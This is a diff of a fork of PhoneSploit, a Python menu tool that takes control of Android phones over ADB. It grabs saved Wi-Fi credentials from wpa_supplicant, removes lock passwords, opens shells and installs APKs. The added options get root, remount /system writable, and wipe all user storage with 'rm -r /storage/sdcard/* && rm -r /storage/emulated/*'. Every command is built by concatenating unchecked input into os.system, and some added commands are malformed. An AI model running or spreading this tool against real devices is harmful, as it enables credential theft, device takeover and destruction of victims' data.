@@ -1,6 +1,6 @@
 #-*- coding: utf-8 -*-
 
-#Coded By Zucccs
+#Coded By Zucccs & Fork by HeroS3c
 # Enjoy
 
 
@@ -62,7 +62,7 @@ logo_design_2 = Fore.GREEN + '''
   .;'                     `;,
  .;'  ,;'             `;,  `;,   {0}PhoneSploit
 .;'  ,;'  ,;'     `;,  `;,  `;,
-::   ::   :   {1}( ){0}   :   ::   ::  {1}Coded by Zucccs / Metachar{0}
+::   ::   :   {1}( ){0}   :   ::   ::  {1}Coded by Zucccs / Metachar / (fork)HeroS3c{0}
 ':.  ':.  ':. {1}/_\{0} ,:'  ,:'  ,:'
  ':.  ':.    {1}/___\{0}    ,:'  ,:'   
   ':.       {1}/_____\{0}      ,:'
@@ -103,28 +103,30 @@ page_1 = '''\n
 {0}[{1}5{0}] {2}Install an apk on a phone   {0}[{1}10{0}] {2}Turn The Device off                {0}[{1}15{0}] {2}Run an app                         
 
 
-{0}[{1}99{0}] {2}Exit   {0}[{1}0{0}] {2}Clear   {0}[{1}p{0}] Next Page                           v1.2
+{0}[{1}99{0}] {2}Exit   {0}[{1}0{0}] {2}Clear   {0}[{1}p{0}] Next Page                           v1.3-fork
 '''.format(Fore.CYAN, Fore.RED, Fore.GREEN)
 
 page_2 = '''\n
-{0}[{1}16{0}]{2} Port Forwarding                {0}[{1}21{0}]{2} NetStat 
-{0}[{1}17{0}]{2} Grab wpa_supplicant            {0}[{1}22{0}]{2} Turn WiFi On/Off                 
-{0}[{1}18{0}]{2} Show Mac/Inet                  {0}[{1}23{0}]{2} Remove Password
-{0}[{1}19{0}]{2} Extract apk from app           {0}[{1}24{0}]{2} Use Keycode            
+{0}[{1}16{0}]{2} Port Forwarding                {0}[{1}21{0}]{2} NetStat            {0}[{1}26{0}]{2} Ping 
+{0}[{1}17{0}]{2} Grab wpa_supplicant            {0}[{1}22{0}]{2} Turn WiFi On/Off   {0}[{1}27{0}]{2} Remount /system in rw
+{0}[{1}18{0}]{2} Show Mac/Inet                  {0}[{1}23{0}]{2} Remove Password    {0}[{1}28{0}]{2} Reboot in recovery mode
+{0}[{1}19{0}]{2} Extract apk from app           {0}[{1}24{0}]{2} Use Keycode        {0}[{1}29{0}]{2} Delete /sdcard and /emulated in Storage 
 {0}[{1}20{0}]{2} Get Battery Status             {0}[{1}25{0}]{2} Get Current Activity                  
 
 
 {0}[{1}99{0}] {2}Exit   {0}[{1}0{0}] {2}Clear   {0}[{1}b{0}] Back to page one
 '''.format(Fore.CYAN, Fore.RED, Fore.GREEN)
 
-
 #=============================
 #Main
 def main():
+
     page_num = 1
     option = raw_input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
     if option == '1':
         os.system("adb devices -l")
+        main()
+        
     elif option  ==  '2':
         os.system("adb disconnect")
     elif option == '3':
@@ -136,7 +138,7 @@ def main():
     elif option  == '4':
         print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
         device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(shell_on_phone) "+Fore.WHITE + "> ")
-        os.system("adb -s "+device_name+" shell")
+        os.system("adb -s "+device_name+" shell su")
 
     elif option == '5':
         print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
@@ -144,7 +146,7 @@ def main():
         print (("     "+connect))
         print (("    [{0}+{1}]Enter the apk location.").format(Fore.RED, Fore.WHITE))
         apk_location = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(apk_install) "+Fore.WHITE + "> ")
-        os.system("adb -s  "+device_name+" install "+apk_location)
+        os.system("adb -s "+device_name+" install "+apk_location)
         print (Fore.GREEN  +  "Apk has been installed.")
 
     elif option ==  '6':
@@ -192,7 +194,7 @@ def main():
         print (("     "+connect))
         print (("    [{0}+{1}]Enter a package name.").format(Fore.RED, Fore.WHITE))
         package_name = raw_input("    "+arrow + "phonesploit"+Fore.RED + "(app_delete) "+Fore.WHITE + "> ")
-        os.system("adb -s "+device_name+" unistall "+package_name)
+        os.system("adb -s "+device_name+" uninstall "+package_name)
 
     elif option == '12':
         print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
@@ -404,6 +406,33 @@ def main():
         os.system("adb -s " +device_name+ " dumpsys activity")
         main()
         
+    elif option == '26':
+        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
+        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(current_activity) "+Fore.WHITE + "> ")
+        IP = raw_input(arrow + "phonesploit"+Fore.RED + "(IP address) "+Fore.WHITE + "> ")
+        os.system("adb -s " +device_name+ "shell || ping -c10 "+IP)
+        main()
+    
+    elif option == '27':
+        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
+        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(current_activity) "+Fore.WHITE + "> ")
+        os.system("adb -s " +device_name+ "su; sudo mount -o rw,remount /system")
+        main()
+    
+    elif option == '28':
+        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
+        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(current_activity) "+Fore.WHITE + "> ")
+        os.system("adb -s " +device_name+ " shell reboot recovery ")
+        print("Rebooting...")
+        main()
+
+    elif option == '29':
+        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
+        device_name = raw_input(arrow + "phonesploit"+Fore.RED + "(current_activity) "+Fore.WHITE + ">") 
+        print("Clearing /Storage...")
+        os.system("adb -s " +device_name+ " shell  'rm -r /storage/sdcard/* && rm -r /storage/emulated/*'")
+        main()
+
     elif option == '0':
         global page2
         if page2 == True:
